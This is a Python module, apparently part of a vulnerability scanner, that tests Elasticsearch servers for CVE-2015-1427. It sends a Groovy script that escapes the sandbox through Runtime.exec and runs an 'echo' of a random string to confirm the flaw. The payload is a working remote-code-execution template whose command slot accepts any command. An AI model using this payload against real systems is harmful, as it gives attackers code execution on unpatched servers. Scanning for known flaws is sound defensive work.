#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check
from time import sleep

random_name = random_md5()

cve_2015_1427_payloads = [
    {
        'path': 'website/blog/',
        'data': '{"name": "RANDOMNAME"}'.replace('RANDOMNAME', random_name),
    },
    {
        'path': '_search?pretty',
        'data': '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"RCECOMMAND\\").getText()"}}}',
    }
]

def cve_2015_1427_scan(self, clients):
    ''' ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本, 
        但显然官方的工作并没有做好, lupin和tang3分别提出了两种执行命令的方法
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2015-1427',
    }

    for payload in cve_2015_1427_payloads:
        random_str = random_md5(6)
        RCEcommand = 'echo ' + random_str
        
        path = payload['path']
        data = payload['data'].replace('RCECOMMAND', RCEcommand)

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                    # * 创建可能有延迟
        if (check.check_res(res.text, random_str)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
